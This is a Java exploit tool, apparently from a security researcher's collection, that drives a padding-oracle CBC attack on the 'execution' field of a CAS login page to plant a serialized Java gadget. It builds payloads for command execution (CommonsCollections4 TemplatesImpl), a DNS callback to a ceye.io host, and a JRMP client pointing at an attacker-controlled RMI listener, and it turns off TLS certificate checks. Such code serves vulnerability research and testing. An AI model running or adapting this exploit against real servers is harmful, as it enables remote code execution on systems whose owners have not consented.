package com.threedr3am.bug.cas;

import com.threedr3am.bug.cas.support.CiphertextHeader;
import com.threedr3am.bug.cas.support.PaddingOracleCBCForShiro;
import com.threedr3am.bug.cas.support.PaddingOracleCBCForShiro.CBCResult;
import com.threedr3am.bug.common.utils.HttpUtil;
import com.threedr3am.bug.common.utils.Reflections;
import com.threedr3am.bug.common.utils.TemplatesUtil;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.UnsupportedEncodingException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.rmi.server.ObjID;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.List;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.GZIPOutputStream;
import javax.net.ssl.SSLContext;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.ssl.SSLContextBuilder;
import org.apache.http.ssl.TrustStrategy;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

/**
 * @author threedr3am
 */
public class CasPaddingOracleCBC {

    private String userUrl;
    private boolean isSsl;
    private SSLConnectionSocketFactory sslsf;

    public static void main(String[] args) throws Exception {
        args = new String[] {"--attack", "http://localhost:8092/cas/login"};
//        byte[] bytes = serialize(cc4(), true);
//        byte[] bytes = serialize(DNS("http://cas.xxxxx.ceye.io"), true);
        byte[] bytes = serialize(jrmpclient("127.0.0.1:23333"), true);
//        byte[] bytes = serialize(new String("xxxxx"), true);
        new CasPaddingOracleCBC(args).attack(bytes);
    }

    public CasPaddingOracleCBC(String[] args) {
        int argoff = 0;

        while (argoff < args.length && args[argoff].charAt(0) == '-') {
            if (args[argoff].equals("--attack")) {
                argoff++;
                userUrl = args[argoff++];
            } else {
                argoff++;
            }
        }

        if (isSsl = userUrl.startsWith("https")) {
            try {
                SSLContext sslContext = new SSLContextBuilder()
                    .loadTrustMaterial(null, new TrustStrategy() {
                        // 信任所有
                        public boolean isTrusted(X509Certificate[] chain,
                            String authType)
                            throws CertificateException {
                            return true;
                        }
                    }).build();
                sslsf = new SSLConnectionSocketFactory(
                    sslContext);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void attack(byte[] bytes) throws UnsupportedEncodingException {
        String origin = null;
        String uuid = null;
        String html = HttpUtil.get(userUrl);
        Matcher matcher = Pattern.compile("name=\"execution\" value=\"(.+?)\"").matcher(html);
        if (matcher.find()) {
            String execution = matcher.group(1);
            if (execution != null && execution.length() > 0) {
                uuid = execution.split("_")[0];
                origin = execution.split("_")[1];
            }
        }
        String finalOrigin = origin;
        String finalUuid = uuid;
        CBCResult cbcResult = PaddingOracleCBCForShiro
            .paddingOracleCBC(bytes, data -> {
                try {
                    byte[] originBytes = Base64.getDecoder().decode(finalOrigin.getBytes());
                    byte[] newOriginBytes = new byte[originBytes.length + data.length];
                    System.arraycopy(originBytes, 0, newOriginBytes, 0, originBytes.length);
                    System.arraycopy(data, 0, newOriginBytes, originBytes.length, data.length);
                    return request(finalUuid + '_' + Base64.getEncoder().encodeToString(newOriginBytes));
                } catch (Exception e) {
                    e.printStackTrace();
                }
                return false;
            });
        CiphertextHeader ciphertextHeader = new CiphertextHeader(cbcResult.getIv(), "aes128");
        byte[] newOriginBytes = new byte[ciphertextHeader.encode().length + cbcResult.getCrypt().length];
        System.arraycopy(ciphertextHeader.encode(), 0, newOriginBytes, 0, ciphertextHeader.encode().length);
        System.arraycopy(cbcResult.getCrypt(), 0, newOriginBytes, ciphertextHeader.encode().length, cbcResult.getCrypt().length);
        request(uuid + "_" + Base64.getEncoder().encodeToString(newOriginBytes));
    }

    private boolean request(String data) throws UnsupportedEncodingException {
        HttpPost httpPost = new HttpPost(userUrl);
        List<NameValuePair> nameValuePairs = new ArrayList<>();
        NameValuePair nameValuePair = new BasicNameValuePair("execution", data);
        nameValuePairs.add(nameValuePair);
        httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
        try {
            HttpClientBuilder httpClientBuilder = HttpClients
                .custom();
            if (isSsl)
                httpClientBuilder.setSSLSocketFactory(sslsf);

            CloseableHttpClient httpClient = null;
            CloseableHttpResponse response = null;
            try {
                httpClient = httpClientBuilder.build();
                response = httpClient.execute(httpPost);
                return response.getStatusLine().getStatusCode() == 200;
            } finally {
                response.close();
                httpClient.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    private static Object cc4() throws Exception {
        Object templates = TemplatesUtil.createTemplatesImpl("/System/Applications/Calculator.app/Contents/MacOS/Calculator");

        // setup harmless chain
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // define the comparator used for sorting
        TransformingComparator comp = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
        TreeBag tree = new TreeBag(comp);
        tree.add(templates);

        // arm transformer
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        return tree;
    }

    public static Object DNS(final String ... url) throws Exception {

        //Avoid DNS resolution during payload creation
        //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
        URLStreamHandler handler = new SilentURLStreamHandler();

        HashMap ht = new HashMap(); // HashMap that will contain the URL
        URL u = new URL(null, url[0], handler); // URL to use as the Key
        ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

        Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

        return ht;
    }

    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }

    public static Object jrmpclient( final String ... command ) throws Exception {

        String host;
        int port;
        int sep = command[0].indexOf(':');
        if ( sep < 0 ) {
            port = new Random().nextInt(65535);
            host = command[0];
        }
        else {
            host = command[0].substring(0, sep);
            port = Integer.valueOf(command[0].substring(sep + 1));
        }
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        return ref;
    }

    private static byte[] serialize(Object o, boolean compression) throws IOException {
        ByteArrayOutputStream outBuffer = new ByteArrayOutputStream();
        ObjectOutputStream out = null;

        try {
            if (compression) {
                out = new ObjectOutputStream(new GZIPOutputStream(outBuffer));
            } else {
                out = new ObjectOutputStream(outBuffer);
            }

            out.writeObject(o);
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (out != null) {
                out.close();
            }

        }
        return outBuffer.toByteArray();
    }
}
